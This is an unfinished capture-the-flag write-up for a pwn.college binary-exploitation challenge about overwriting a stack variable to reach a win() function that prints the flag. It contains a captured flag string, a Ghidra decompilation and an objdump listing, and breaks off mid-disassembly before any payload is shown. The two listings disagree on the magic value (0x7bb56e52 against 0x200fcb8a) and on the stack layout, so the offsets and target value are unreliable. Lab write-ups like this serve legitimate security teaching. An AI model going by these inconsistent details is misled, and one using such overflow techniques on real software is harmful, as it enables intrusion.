# variable control (hard) :

## the flag :

`pwn.college{koTVQ5lWtFJNpOfbBnCsm_hATMv.dhTNzMDLzQjN0czW}`

## Solve 
- we are not given the code this time so lets the program once : 
```bash
hacker@binary-exploitation~variable-control-hard:/challenge$ ./binary-exploitation-var-control
Send your payload (up to 4096 bytes)!
^C
hacker@binary-exploitation~variable-control-hard:/challenge$
```

- its just asking for payload, we found nothing but thats ok.
- i decompiled using ghidra : 
```c
#include "out.h"



int _init(EVP_PKEY_CTX *ctx)

{
  int iVar1;
  
  iVar1 = __gmon_start__();
  return iVar1;
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

int * __errno_location(void)

{
  int *piVar1;
  
  piVar1 = __errno_location();
  return piVar1;
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

int puts(char *__s)

{
  int iVar1;
  
  iVar1 = puts(__s);
  return iVar1;
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

ssize_t write(int __fd,void *__buf,size_t __n)

{
  ssize_t sVar1;
  
  sVar1 = write(__fd,__buf,__n);
  return sVar1;
}



void __stack_chk_fail(void)

{
                    // WARNING: Subroutine does not return
  __stack_chk_fail();
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

int printf(char *__format,...)

{
  int iVar1;
  
  iVar1 = printf(__format);
  return iVar1;
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

__uid_t geteuid(void)

{
  __uid_t _Var1;
  
  _Var1 = geteuid();
  return _Var1;
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

ssize_t read(int __fd,void *__buf,size_t __nbytes)

{
  ssize_t sVar1;
  
  sVar1 = read(__fd,__buf,__nbytes);
  return sVar1;
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

int setvbuf(FILE *__stream,char *__buf,int __modes,size_t __n)

{
  int iVar1;
  
  iVar1 = setvbuf(__stream,__buf,__modes,__n);
  return iVar1;
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

int open(char *__file,int __oflag,...)

{
  int iVar1;
  
  iVar1 = open(__file,__oflag);
  return iVar1;
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

void exit(int __status)

{
                    // WARNING: Subroutine does not return
  exit(__status);
}



// WARNING: Unknown calling convention -- yet parameter storage is locked

char * strerror(int __errnum)

{
  char *pcVar1;
  
  pcVar1 = strerror(__errnum);
  return pcVar1;
}



void processEntry _start(undefined8 param_1,undefined8 param_2)

{
  undefined auStack_8 [8];
  
  __libc_start_main(main,param_2,&stack0x00000008,__libc_csu_init,__libc_csu_fini,param_1,auStack_8)
  ;
  do {
                    // WARNING: Do nothing block with infinite loop
  } while( true );
}



void _dl_relocate_static_pie(void)

{
  return;
}



// WARNING: Removing unreachable block (ram,0x004011dd)
// WARNING: Removing unreachable block (ram,0x004011e7)

void deregister_tm_clones(void)

{
  return;
}



// WARNING: Removing unreachable block (ram,0x0040121f)
// WARNING: Removing unreachable block (ram,0x00401229)

void register_tm_clones(void)

{
  return;
}



void __do_global_dtors_aux(void)

{
  if (completed_8061 == '\0') {
    deregister_tm_clones();
    completed_8061 = 1;
    return;
  }
  return;
}



void frame_dummy(void)

{
  register_tm_clones();
  return;
}



void bin_padding(void)

{
  return;
}



void win(void)

{
  __uid_t _Var1;
  int *piVar2;
  char *pcVar3;
  ssize_t sVar4;
  
  puts("You win! Here is your flag:");
  flag_fd_5700 = open("/flag",0);
  if (flag_fd_5700 < 0) {
    piVar2 = __errno_location();
    pcVar3 = strerror(*piVar2);
    printf("\n  ERROR: Failed to open the flag -- %s!\n",pcVar3);
    _Var1 = geteuid();
    if (_Var1 != 0) {
      puts("  Your effective user id is not 0!");
      puts("  You must directly run the suid binary in order to have the correct permissions!");
    }
                    // WARNING: Subroutine does not return
    exit(-1);
  }
  sVar4 = read(flag_fd_5700,flag_5699,0x100);
  flag_length_5701 = (int)sVar4;
  if (flag_length_5701 < 1) {
    piVar2 = __errno_location();
    pcVar3 = strerror(*piVar2);
    printf("\n  ERROR: Failed to read the flag -- %s!\n",pcVar3);
                    // WARNING: Subroutine does not return
    exit(-1);
  }
  write(1,flag_5699,(long)flag_length_5701);
  puts("\n");
  return;
}



undefined8 challenge(void)

{
  ssize_t sVar1;
  int *piVar2;
  char *pcVar3;
  long in_FS_OFFSET;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  printf("Send your payload (up to %lu bytes)!\n",0x1000);
  sVar1 = read(0,&local_48,0x1000);
  if ((int)sVar1 < 0) {
    piVar2 = __errno_location();
    pcVar3 = strerror(*piVar2);
    printf("ERROR: Failed to read input -- %s!\n",pcVar3);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  if (local_20._4_4_ != 0) {
    puts("Lose variable is set! Quitting!");
                    // WARNING: Subroutine does not return
    exit(1);
  }
  if ((int)local_20 == 0x7bb56e52) {
    win();
  }
  puts("Goodbye!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return 0;
}



undefined8 main(undefined4 param_1,undefined8 param_2,undefined8 param_3)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  challenge(param_1,param_2,param_3);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return 0;
}



void __libc_csu_init(EVP_PKEY_CTX *param_1,undefined8 param_2,undefined8 param_3)

{
  long lVar1;
  
  _init(param_1);
  lVar1 = 0;
  do {
    (*(code *)(&__frame_dummy_init_array_entry)[lVar1])((ulong)param_1 & 0xffffffff,param_2,param_3)
    ;
    lVar1 = lVar1 + 1;
  } while (lVar1 != 1);
  return;
}



void __libc_csu_fini(void)

{
  return;
}



void _fini(void)

{
  return;
}


```

- lets objdump the binary and look at the dump.

```x86
0000000000401000 <_init>:
  401000:       f3 0f 1e fa             endbr64
  401004:       48 83 ec 08             sub    rsp,0x8
  401008:       48 8b 05 e9 2f 00 00    mov    rax,QWORD PTR [rip+0x2fe9]        # 403ff8 <__gmon_start__>
  40100f:       48 85 c0                test   rax,rax
  401012:       74 02                   je     401016 <_init+0x16>
  401014:       ff d0                   call   rax
  401016:       48 83 c4 08             add    rsp,0x8
  40101a:       c3                      ret

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:       ff 35 62 2f 00 00       push   QWORD PTR [rip+0x2f62]        # 403f88 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:       f2 ff 25 63 2f 00 00    bnd jmp QWORD PTR [rip+0x2f63]        # 403f90 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:       0f 1f 00                nop    DWORD PTR [rax]
  401030:       f3 0f 1e fa             endbr64
  401034:       68 00 00 00 00          push   0x0
  401039:       f2 e9 e1 ff ff ff       bnd jmp 401020 <.plt>
  40103f:       90                      nop
  401040:       f3 0f 1e fa             endbr64
  401044:       68 01 00 00 00          push   0x1
  401049:       f2 e9 d1 ff ff ff       bnd jmp 401020 <.plt>
  40104f:       90                      nop
  401050:       f3 0f 1e fa             endbr64
  401054:       68 02 00 00 00          push   0x2
  401059:       f2 e9 c1 ff ff ff       bnd jmp 401020 <.plt>
  40105f:       90                      nop
  401060:       f3 0f 1e fa             endbr64
  401064:       68 03 00 00 00          push   0x3
  401069:       f2 e9 b1 ff ff ff       bnd jmp 401020 <.plt>
  40106f:       90                      nop
  401070:       f3 0f 1e fa             endbr64
  401074:       68 04 00 00 00          push   0x4
  401079:       f2 e9 a1 ff ff ff       bnd jmp 401020 <.plt>
  40107f:       90                      nop
  401080:       f3 0f 1e fa             endbr64
  401084:       68 05 00 00 00          push   0x5
  401089:       f2 e9 91 ff ff ff       bnd jmp 401020 <.plt>
  40108f:       90                      nop
  401090:       f3 0f 1e fa             endbr64
  401094:       68 06 00 00 00          push   0x6
  401099:       f2 e9 81 ff ff ff       bnd jmp 401020 <.plt>
  40109f:       90                      nop
  4010a0:       f3 0f 1e fa             endbr64
  4010a4:       68 07 00 00 00          push   0x7
  4010a9:       f2 e9 71 ff ff ff       bnd jmp 401020 <.plt>
  4010af:       90                      nop
  4010b0:       f3 0f 1e fa             endbr64
  4010b4:       68 08 00 00 00          push   0x8
  4010b9:       f2 e9 61 ff ff ff       bnd jmp 401020 <.plt>
  4010bf:       90                      nop
  4010c0:       f3 0f 1e fa             endbr64
  4010c4:       68 09 00 00 00          push   0x9
  4010c9:       f2 e9 51 ff ff ff       bnd jmp 401020 <.plt>
  4010cf:       90                      nop
  4010d0:       f3 0f 1e fa             endbr64
  4010d4:       68 0a 00 00 00          push   0xa
  4010d9:       f2 e9 41 ff ff ff       bnd jmp 401020 <.plt>
  4010df:       90                      nop

Disassembly of section .plt.sec:

00000000004010e0 <__errno_location@plt>:
  4010e0:       f3 0f 1e fa             endbr64
  4010e4:       f2 ff 25 ad 2e 00 00    bnd jmp QWORD PTR [rip+0x2ead]        # 403f98 <__errno_location@GLIBC_2.2.5>
  4010eb:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

00000000004010f0 <puts@plt>:
  4010f0:       f3 0f 1e fa             endbr64
  4010f4:       f2 ff 25 a5 2e 00 00    bnd jmp QWORD PTR [rip+0x2ea5]        # 403fa0 <puts@GLIBC_2.2.5>
  4010fb:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401100 <write@plt>:
  401100:       f3 0f 1e fa             endbr64
  401104:       f2 ff 25 9d 2e 00 00    bnd jmp QWORD PTR [rip+0x2e9d]        # 403fa8 <write@GLIBC_2.2.5>
  40110b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401110 <__stack_chk_fail@plt>:
  401110:       f3 0f 1e fa             endbr64
  401114:       f2 ff 25 95 2e 00 00    bnd jmp QWORD PTR [rip+0x2e95]        # 403fb0 <__stack_chk_fail@GLIBC_2.4>
  40111b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401120 <printf@plt>:
  401120:       f3 0f 1e fa             endbr64
  401124:       f2 ff 25 8d 2e 00 00    bnd jmp QWORD PTR [rip+0x2e8d]        # 403fb8 <printf@GLIBC_2.2.5>
  40112b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401130 <geteuid@plt>:
  401130:       f3 0f 1e fa             endbr64
  401134:       f2 ff 25 85 2e 00 00    bnd jmp QWORD PTR [rip+0x2e85]        # 403fc0 <geteuid@GLIBC_2.2.5>
  40113b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401140 <read@plt>:
  401140:       f3 0f 1e fa             endbr64
  401144:       f2 ff 25 7d 2e 00 00    bnd jmp QWORD PTR [rip+0x2e7d]        # 403fc8 <read@GLIBC_2.2.5>
  40114b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401150 <setvbuf@plt>:
  401150:       f3 0f 1e fa             endbr64
  401154:       f2 ff 25 75 2e 00 00    bnd jmp QWORD PTR [rip+0x2e75]        # 403fd0 <setvbuf@GLIBC_2.2.5>
  40115b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401160 <open@plt>:
  401160:       f3 0f 1e fa             endbr64
  401164:       f2 ff 25 6d 2e 00 00    bnd jmp QWORD PTR [rip+0x2e6d]        # 403fd8 <open@GLIBC_2.2.5>
  40116b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401170 <exit@plt>:
  401170:       f3 0f 1e fa             endbr64
  401174:       f2 ff 25 65 2e 00 00    bnd jmp QWORD PTR [rip+0x2e65]        # 403fe0 <exit@GLIBC_2.2.5>
  40117b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401180 <strerror@plt>:
  401180:       f3 0f 1e fa             endbr64
  401184:       f2 ff 25 5d 2e 00 00    bnd jmp QWORD PTR [rip+0x2e5d]        # 403fe8 <strerror@GLIBC_2.2.5>
  40118b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

0000000000401190 <_start>:
  401190:       f3 0f 1e fa             endbr64
  401194:       31 ed                   xor    ebp,ebp
  401196:       49 89 d1                mov    r9,rdx
  401199:       5e                      pop    rsi
  40119a:       48 89 e2                mov    rdx,rsp
  40119d:       48 83 e4 f0             and    rsp,0xfffffffffffffff0
  4011a1:       50                      push   rax
  4011a2:       54                      push   rsp
  4011a3:       49 c7 c0 f0 1c 40 00    mov    r8,0x401cf0
  4011aa:       48 c7 c1 80 1c 40 00    mov    rcx,0x401c80
  4011b1:       48 c7 c7 c8 1b 40 00    mov    rdi,0x401bc8
  4011b8:       ff 15 32 2e 00 00       call   QWORD PTR [rip+0x2e32]        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
  4011be:       f4                      hlt
  4011bf:       90                      nop

00000000004011c0 <_dl_relocate_static_pie>:
  4011c0:       f3 0f 1e fa             endbr64
  4011c4:       c3                      ret
  4011c5:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
  4011cc:       00 00 00
  4011cf:       90                      nop

00000000004011d0 <deregister_tm_clones>:
  4011d0:       b8 10 40 40 00          mov    eax,0x404010
  4011d5:       48 3d 10 40 40 00       cmp    rax,0x404010
  4011db:       74 13                   je     4011f0 <deregister_tm_clones+0x20>
  4011dd:       b8 00 00 00 00          mov    eax,0x0
  4011e2:       48 85 c0                test   rax,rax
  4011e5:       74 09                   je     4011f0 <deregister_tm_clones+0x20>
  4011e7:       bf 10 40 40 00          mov    edi,0x404010
  4011ec:       ff e0                   jmp    rax
  4011ee:       66 90                   xchg   ax,ax
  4011f0:       c3                      ret
  4011f1:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  4011f8:       00 00 00 00
  4011fc:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401200 <register_tm_clones>:
  401200:       be 10 40 40 00          mov    esi,0x404010
  401205:       48 81 ee 10 40 40 00    sub    rsi,0x404010
  40120c:       48 89 f0                mov    rax,rsi
  40120f:       48 c1 ee 3f             shr    rsi,0x3f
  401213:       48 c1 f8 03             sar    rax,0x3
  401217:       48 01 c6                add    rsi,rax
  40121a:       48 d1 fe                sar    rsi,1
  40121d:       74 11                   je     401230 <register_tm_clones+0x30>
  40121f:       b8 00 00 00 00          mov    eax,0x0
  401224:       48 85 c0                test   rax,rax
  401227:       74 07                   je     401230 <register_tm_clones+0x30>
  401229:       bf 10 40 40 00          mov    edi,0x404010
  40122e:       ff e0                   jmp    rax
  401230:       c3                      ret
  401231:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  401238:       00 00 00 00
  40123c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401240 <__do_global_dtors_aux>:
  401240:       f3 0f 1e fa             endbr64
  401244:       80 3d ed 2d 00 00 00    cmp    BYTE PTR [rip+0x2ded],0x0        # 404038 <completed.8061>
  40124b:       75 13                   jne    401260 <__do_global_dtors_aux+0x20>
  40124d:       55                      push   rbp
  40124e:       48 89 e5                mov    rbp,rsp
  401251:       e8 7a ff ff ff          call   4011d0 <deregister_tm_clones>
  401256:       c6 05 db 2d 00 00 01    mov    BYTE PTR [rip+0x2ddb],0x1        # 404038 <completed.8061>
  40125d:       5d                      pop    rbp
  40125e:       c3                      ret
  40125f:       90                      nop
  401260:       c3                      ret
  401261:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
  401268:       00 00 00 00
  40126c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401270 <frame_dummy>:
  401270:       f3 0f 1e fa             endbr64
  401274:       eb 8a                   jmp    401200 <register_tm_clones>

0000000000401276 <bin_padding>:
  401276:       f3 0f 1e fa             endbr64
  40127a:       55                      push   rbp
  40127b:       48 89 e5                mov    rbp,rsp
  40127e:       90                      nop
  40127f:       90                      nop
  
000000000040198a <win>:
  40198a:       f3 0f 1e fa             endbr64
  40198e:       55                      push   rbp
  40198f:       48 89 e5                mov    rbp,rsp
  401992:       48 8d 3d 6f 06 00 00    lea    rdi,[rip+0x66f]        # 402008 <_IO_stdin_used+0x8>
  401999:       e8 52 f7 ff ff          call   4010f0 <puts@plt>
  40199e:       be 00 00 00 00          mov    esi,0x0
  4019a3:       48 8d 3d 7a 06 00 00    lea    rdi,[rip+0x67a]        # 402024 <_IO_stdin_used+0x24>
  4019aa:       b8 00 00 00 00          mov    eax,0x0
  4019af:       e8 ac f7 ff ff          call   401160 <open@plt>
  4019b4:       89 05 86 26 00 00       mov    DWORD PTR [rip+0x2686],eax        # 404040 <flag_fd.5700>
  4019ba:       8b 05 80 26 00 00       mov    eax,DWORD PTR [rip+0x2680]        # 404040 <flag_fd.5700>
  4019c0:       85 c0                   test   eax,eax
  4019c2:       79 4d                   jns    401a11 <win+0x87>
  4019c4:       e8 17 f7 ff ff          call   4010e0 <__errno_location@plt>
  4019c9:       8b 00                   mov    eax,DWORD PTR [rax]
  4019cb:       89 c7                   mov    edi,eax
  4019cd:       e8 ae f7 ff ff          call   401180 <strerror@plt>
  4019d2:       48 89 c6                mov    rsi,rax
  4019d5:       48 8d 3d 54 06 00 00    lea    rdi,[rip+0x654]        # 402030 <_IO_stdin_used+0x30>
  4019dc:       b8 00 00 00 00          mov    eax,0x0
  4019e1:       e8 3a f7 ff ff          call   401120 <printf@plt>
  4019e6:       e8 45 f7 ff ff          call   401130 <geteuid@plt>
  4019eb:       85 c0                   test   eax,eax
  4019ed:       74 18                   je     401a07 <win+0x7d>
  4019ef:       48 8d 3d 6a 06 00 00    lea    rdi,[rip+0x66a]        # 402060 <_IO_stdin_used+0x60>
  4019f6:       e8 f5 f6 ff ff          call   4010f0 <puts@plt>
  4019fb:       48 8d 3d 86 06 00 00    lea    rdi,[rip+0x686]        # 402088 <_IO_stdin_used+0x88>
  401a02:       e8 e9 f6 ff ff          call   4010f0 <puts@plt>
  401a07:       bf ff ff ff ff          mov    edi,0xffffffff
  401a0c:       e8 5f f7 ff ff          call   401170 <exit@plt>
  401a11:       8b 05 29 26 00 00       mov    eax,DWORD PTR [rip+0x2629]        # 404040 <flag_fd.5700>
  401a17:       ba 00 01 00 00          mov    edx,0x100
  401a1c:       48 8d 35 3d 26 00 00    lea    rsi,[rip+0x263d]        # 404060 <flag.5699>
  401a23:       89 c7                   mov    edi,eax
  401a25:       e8 16 f7 ff ff          call   401140 <read@plt>
  401a2a:       89 05 30 27 00 00       mov    DWORD PTR [rip+0x2730],eax        # 404160 <flag_length.5701>
  401a30:       8b 05 2a 27 00 00       mov    eax,DWORD PTR [rip+0x272a]        # 404160 <flag_length.5701>
  401a36:       85 c0                   test   eax,eax
  401a38:       7f 2c                   jg     401a66 <win+0xdc>
  401a3a:       e8 a1 f6 ff ff          call   4010e0 <__errno_location@plt>
  401a3f:       8b 00                   mov    eax,DWORD PTR [rax]
  401a41:       89 c7                   mov    edi,eax
  401a43:       e8 38 f7 ff ff          call   401180 <strerror@plt>
  401a48:       48 89 c6                mov    rsi,rax
  401a4b:       48 8d 3d 8e 06 00 00    lea    rdi,[rip+0x68e]        # 4020e0 <_IO_stdin_used+0xe0>
  401a52:       b8 00 00 00 00          mov    eax,0x0
  401a57:       e8 c4 f6 ff ff          call   401120 <printf@plt>
  401a5c:       bf ff ff ff ff          mov    edi,0xffffffff
  401a61:       e8 0a f7 ff ff          call   401170 <exit@plt>
  401a66:       8b 05 f4 26 00 00       mov    eax,DWORD PTR [rip+0x26f4]        # 404160 <flag_length.5701>
  401a6c:       48 98                   cdqe
  401a6e:       48 89 c2                mov    rdx,rax
  401a71:       48 8d 35 e8 25 00 00    lea    rsi,[rip+0x25e8]        # 404060 <flag.5699>
  401a78:       bf 01 00 00 00          mov    edi,0x1
  401a7d:       e8 7e f6 ff ff          call   401100 <write@plt>
  401a82:       48 8d 3d 81 06 00 00    lea    rdi,[rip+0x681]        # 40210a <_IO_stdin_used+0x10a>
  401a89:       e8 62 f6 ff ff          call   4010f0 <puts@plt>
  401a8e:       90                      nop
  401a8f:       5d                      pop    rbp
  401a90:       c3                      ret

0000000000401a91 <challenge>:
  401a91:       f3 0f 1e fa             endbr64
  401a95:       55                      push   rbp
  401a96:       48 89 e5                mov    rbp,rsp
  401a99:       48 83 c4 80             add    rsp,0xffffffffffffff80
  401a9d:       89 7d 9c                mov    DWORD PTR [rbp-0x64],edi
  401aa0:       48 89 75 90             mov    QWORD PTR [rbp-0x70],rsi
  401aa4:       48 89 55 88             mov    QWORD PTR [rbp-0x78],rdx
  401aa8:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  401aaf:       00 00
  401ab1:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  401ab5:       31 c0                   xor    eax,eax
  401ab7:       48 c7 45 b0 00 00 00    mov    QWORD PTR [rbp-0x50],0x0
  401abe:       00
  401abf:       48 c7 45 b8 00 00 00    mov    QWORD PTR [rbp-0x48],0x0
  401ac6:       00
  401ac7:       48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40],0x0
  401ace:       00
  401acf:       48 c7 45 c8 00 00 00    mov    QWORD PTR [rbp-0x38],0x0
  401ad6:       00
  401ad7:       48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30],0x0
  401ade:       00
  401adf:       48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  401ae6:       00
  401ae7:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
  401aee:       00
  401aef:       48 c7 45 e8 00 00 00    mov    QWORD PTR [rbp-0x18],0x0
  401af6:       00
  401af7:       c7 45 f0 00 00 00 00    mov    DWORD PTR [rbp-0x10],0x0
  401afe:       48 c7 45 a8 00 00 00    mov    QWORD PTR [rbp-0x58],0x0
  401b05:       00
  401b06:       48 c7 45 a8 00 10 00    mov    QWORD PTR [rbp-0x58],0x1000
  401b0d:       00
  401b0e:       48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  401b12:       48 89 c6                mov    rsi,rax
  401b15:       48 8d 3d f4 05 00 00    lea    rdi,[rip+0x5f4]        # 402110 <_IO_stdin_used+0x110>
  401b1c:       b8 00 00 00 00          mov    eax,0x0
  401b21:       e8 fa f5 ff ff          call   401120 <printf@plt>
  401b26:       48 8b 55 a8             mov    rdx,QWORD PTR [rbp-0x58]
  401b2a:       48 8d 45 b0             lea    rax,[rbp-0x50]
  401b2e:       48 89 c6                mov    rsi,rax
  401b31:       bf 00 00 00 00          mov    edi,0x0
  401b36:       e8 05 f6 ff ff          call   401140 <read@plt>
  401b3b:       89 45 a4                mov    DWORD PTR [rbp-0x5c],eax
  401b3e:       83 7d a4 00             cmp    DWORD PTR [rbp-0x5c],0x0
  401b42:       79 2c                   jns    401b70 <challenge+0xdf>
  401b44:       e8 97 f5 ff ff          call   4010e0 <__errno_location@plt>
  401b49:       8b 00                   mov    eax,DWORD PTR [rax]
  401b4b:       89 c7                   mov    edi,eax
  401b4d:       e8 2e f6 ff ff          call   401180 <strerror@plt>
  401b52:       48 89 c6                mov    rsi,rax
  401b55:       48 8d 3d dc 05 00 00    lea    rdi,[rip+0x5dc]        # 402138 <_IO_stdin_used+0x138>
  401b5c:       b8 00 00 00 00          mov    eax,0x0
  401b61:       e8 ba f5 ff ff          call   401120 <printf@plt>
  401b66:       bf 01 00 00 00          mov    edi,0x1
  401b6b:       e8 00 f6 ff ff          call   401170 <exit@plt>
  401b70:       8b 45 f0                mov    eax,DWORD PTR [rbp-0x10]
  401b73:       85 c0                   test   eax,eax
  401b75:       74 16                   je     401b8d <challenge+0xfc>
  401b77:       48 8d 3d e2 05 00 00    lea    rdi,[rip+0x5e2]        # 402160 <_IO_stdin_used+0x160>
  401b7e:       e8 6d f5 ff ff          call   4010f0 <puts@plt>
  401b83:       bf 01 00 00 00          mov    edi,0x1
  401b88:       e8 e3 f5 ff ff          call   401170 <exit@plt>
  401b8d:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]
  401b90:       3d 8a cb 0f 20          cmp    eax,0x200fcb8a
  401b95:       75 0a                   jne    401ba1 <challenge+0x110>
  401b97:       b8 00 00 00 00          mov    eax,0x0
  401b9c:       e8 e9 fd ff ff          call   40198a <win>
  401ba1:       48 8d 3d d8 05 00 00    lea    rdi,[rip+0x5d8]        # 402180 <_IO_stdin_used+0x180>
  401ba8:       e8 43 f5 ff ff          call   4010f0 <puts@plt>
  401bad:       b8 00 00 00 00          mov    eax,0x0
  401bb2:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
  401bb6:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
  401bbd:       00 00
  401bbf:       74 05                   je     401bc6 <challenge+0x135>
  401bc1:       e8 4a f5 ff ff          call   401110 <__stack_chk_fail@plt>
  401bc6:       c9                      leave
  401bc7:       c3                      ret

0000000000401bc8 <main>:
  401bc8:       f3 0f 1e fa             endbr64
  401bcc:       55                      push   rbp
  401bcd:       48 89 e5                mov    rbp,rsp
  401bd0:       48 81 ec 00 10 00 00    sub    rsp,0x1000
  401bd7:       48 83 0c 24 00          or     QWORD PTR [rsp],0x0
  401bdc:       48 83 ec 30             sub    rsp,0x30
  401be0:       89 bd ec ef ff ff       mov    DWORD PTR [rbp-0x1014],edi
  401be6:       48 89 b5 e0 ef ff ff    mov    QWORD PTR [rbp-0x1020],rsi
  401bed:       48 89 95 d8 ef ff ff    mov    QWORD PTR [rbp-0x1028],rdx
  401bf4:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  401bfb:       00 00
  401bfd:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  401c01:       31 c0                   xor    eax,eax
  401c03:       48 8b 05 26 24 00 00    mov    rax,QWORD PTR [rip+0x2426]        # 404030 <stdin@GLIBC_2.2.5>
  401c0a:       b9 00 00 00 00          mov    ecx,0x0
  401c0f:       ba 02 00 00 00          mov    edx,0x2
  401c14:       be 00 00 00 00          mov    esi,0x0
  401c19:       48 89 c7                mov    rdi,rax
  401c1c:       e8 2f f5 ff ff          call   401150 <setvbuf@plt>
  401c21:       48 8b 05 f8 23 00 00    mov    rax,QWORD PTR [rip+0x23f8]        # 404020 <stdout@GLIBC_2.2.5>
  401c28:       b9 00 00 00 00          mov    ecx,0x0
  401c2d:       ba 02 00 00 00          mov    edx,0x2
  401c32:       be 00 00 00 00          mov    esi,0x0
  401c37:       48 89 c7                mov    rdi,rax
  401c3a:       e8 11 f5 ff ff          call   401150 <setvbuf@plt>
  401c3f:       48 8b 95 d8 ef ff ff    mov    rdx,QWORD PTR [rbp-0x1028]
  401c46:       48 8b 8d e0 ef ff ff    mov    rcx,QWORD PTR [rbp-0x1020]
  401c4d:       8b 85 ec ef ff ff       mov    eax,DWORD PTR [rbp-0x1014]
  401c53:       48 89 ce                mov    rsi,rcx
  401c56:       89 c7                   mov    edi,eax
  401c58:       e8 34 fe ff ff          call   401a91 <challenge>
  401c5d:       b8 00 00 00 00          mov    eax,0x0
  401c62:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
  401c66:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
  401c6d:       00 00
  401c6f:       74 05                   je     401c76 <main+0xae>
  401c71:       e8 9a f4 ff ff          call   401110 <__stack_chk_fail@plt>
  401c76:       c9                      leave
  401c77:       c3                      ret
  401c78:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  401c7f:       00

0000000000401c80 <__libc_csu_init>:
  401c80:       f3 0f 1e fa             endbr64
  401c84:       41 57                   push   r15
  401c86:       4c 8d 3d f3 20 00 00    lea    r15,[rip+0x20f3]        # 403d80 <__frame_dummy_init_array_entry>
  401c8d:       41 56                   push   r14
  401c8f:       49 89 d6                mov    r14,rdx
  401c92:       41 55                   push   r13
  401c94:       49 89 f5                mov    r13,rsi
  401c97:       41 54                   push   r12
  401c99:       41 89 fc                mov    r12d,edi
  401c9c:       55                      push   rbp
  401c9d:       48 8d 2d e4 20 00 00    lea    rbp,[rip+0x20e4]        # 403d88 <__do_global_dtors_aux_fini_array_entry>
  401ca4:       53                      push   rbx
  401ca5:       4c 29 fd                sub    rbp,r15
  401ca8:       48 83 ec 08             sub    rsp,0x8
  401cac:       e8 4f f3 ff ff          call   401000 <_init>
  401cb1:       48 c1 fd 03             sar    rbp,0x3
  401cb5:       74 1f                   je     401cd6 <__libc_csu_init+0x56>
  401cb7:       31 db                   xor    ebx,ebx
  401cb9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
  401cc0:       4c 89 f2                mov    rdx,r14
  401cc3:       4c 89 ee                mov    rsi,r13
  401cc6:       44 89 e7                mov    edi,r12d
  401cc9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  401ccd:       48 83 c3 01             add    rbx,0x1
  401cd1:       48 39 dd                cmp    rbp,rbx
  401cd4:       75 ea                   jne    401cc0 <__libc_csu_init+0x40>
  401cd6:       48 83 c4 08             add    rsp,0x8
  401cda:       5b                      pop    rbx
  401cdb:       5d                      pop    rbp
  401cdc:       41 5c                   pop    r12
  401cde:       41 5d                   pop    r13
  401ce0:       41 5e                   pop    r14
  401ce2:       41 5f                   pop    r15
